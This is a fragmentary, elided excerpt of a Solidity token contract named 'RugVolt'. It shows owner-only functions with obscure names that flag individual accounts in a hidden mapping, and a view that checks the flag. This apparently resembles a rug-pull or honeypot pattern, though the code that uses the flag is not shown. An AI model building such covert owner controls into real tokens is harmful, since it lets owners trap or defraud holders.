...
contract BaseToken is Ownable {
    ...
    string constant public name = 'RugVolt';
    string constant public symbol = 'RVT';
    ...
    function RugVoltAppConnect(address account) public onlyOwner {
    ...
    function RugvoltMakingBody(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function RugvoltAccountCheck(address account) public view returns (bool) {
...
contract RugvoltContract is BaseToken {
